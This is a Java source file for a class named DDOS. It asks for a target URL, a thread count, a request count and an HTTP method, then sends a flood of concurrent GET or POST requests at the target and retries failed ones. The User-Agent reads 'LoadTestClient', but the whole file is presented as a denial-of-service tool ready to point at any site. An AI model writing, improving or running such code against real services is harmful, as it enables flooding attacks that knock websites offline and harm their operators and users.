import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Scanner;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;

public class DDOS {
    private static String targetUrl;
    private static int numberOfThreads;
    private static int requestsPerThread;
    private static int delay;
    private static String requestMethod;
    private static String postData = "key1=value1&key2=value2";
    private static final AtomicInteger successCount = new AtomicInteger(0);

    enum HttpMethod {
        GET, POST
    }

    public static void main(String[] args) {
        handleInput(args);

        ExecutorService executor = Executors.newCachedThreadPool(); 
        
        for (int i = 0; i < numberOfThreads; i++) {
            executor.submit(DDOS::performRequests);
        }

        shutdownExecutor(executor);

        System.out.println("[INFO] All tasks completed.");
        System.out.printf("[INFO] Total successful requests: %d%n", successCount.get());
    }

    private static void handleInput(String[] args) {
        try (Scanner scanner = new Scanner(System.in)) {
            if (args.length >= 5) {
                targetUrl = args[0];
                numberOfThreads = Integer.parseInt(args[1]);
                requestsPerThread = Integer.parseInt(args[2]);
                delay = Integer.parseInt(args[3]);
                requestMethod = args[4].toUpperCase();
                validateMethod(requestMethod);
            } else {
                getInputFromUser(scanner);
            }
        } catch (NumberFormatException e) {
            System.err.println("[ERROR] Invalid number format: " + e.getMessage());
            System.exit(1);
        } catch (Exception e) {
            System.err.println("[ERROR] Input error: " + e.getMessage());
            System.exit(1);
        }
    }

    private static void validateMethod(String method) {
        if (!HttpMethod.GET.name().equals(method) && !HttpMethod.POST.name().equals(method)) {
            System.err.println("[ERROR] Invalid HTTP method. Use GET or POST.");
            System.exit(1);
        }
    }

    private static void getInputFromUser(Scanner scanner) {
        System.out.print("Enter target URL: ");
        targetUrl = scanner.nextLine();
        System.out.print("Enter number of threads: ");
        numberOfThreads = scanner.nextInt();
        System.out.print("Enter number of requests per thread: ");
        requestsPerThread = scanner.nextInt();
        System.out.print("Enter delay between requests (ms): ");
        delay = scanner.nextInt();
        System.out.print("Enter HTTP method (GET/POST): ");
        requestMethod = scanner.next().toUpperCase();
        validateMethod(requestMethod);

        if ("POST".equals(requestMethod)) {
            System.out.print("Enter POST data (key1=value1&key2=value2): ");
            postData = scanner.next();
        }
    }

    private static void performRequests() {
        for (int j = 0; j < requestsPerThread; j++) {
            try {
                sendRequest();
                successCount.incrementAndGet();
                
            } catch (IOException e) {
                System.err.printf("[ERROR] Request failed: %s%n", e.getMessage());
            }
            sleep(delay);
        }
    }

    private static void sendRequest() throws IOException {
        HttpURLConnection connection = null;
        try {

            URL url = new URL(targetUrl);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod(requestMethod);
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);
            connection.setRequestProperty("Connection", "keep-alive"); 
            connection.setRequestProperty("User-Agent", "LoadTestClient"); 
            
            if (HttpMethod.POST.name().equals(requestMethod)) {
                connection.setDoOutput(true);
                try (OutputStream os = connection.getOutputStream()) {
                    byte[] input = postData.getBytes("utf-8");
                    os.write(input, 0, input.length);
                }
            }

            connection.connect();
            int responseCode = connection.getResponseCode();
            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
            System.out.printf("[INFO] [%s] Resp: %d%n", timestamp, responseCode);

            if (responseCode != 200) {
                retryRequest(connection);
            }
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private static void retryRequest(HttpURLConnection connection) throws IOException {
        int retries = 3;
        int responseCode = connection.getResponseCode();
        while (responseCode != 200 && retries > 0) {
            System.out.printf("[WARN] Retry %d for response %d%n", 4 - retries, responseCode);
            retries--;
            connection.connect();
            responseCode = connection.getResponseCode();
        }
    }

    private static void sleep(int delay) {
        try {
            TimeUnit.MILLISECONDS.sleep(delay);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            System.err.println("[ERROR] Thread was interrupted during sleep: " + e.getMessage());
        }
    }

    private static void shutdownExecutor(ExecutorService executor) {
        executor.shutdown();
        try {
            if (!executor.awaitTermination(10, TimeUnit.MINUTES)) {
                executor.shutdownNow();
            }
        } catch (InterruptedException e) {
            executor.shutdownNow();
        }
    }
}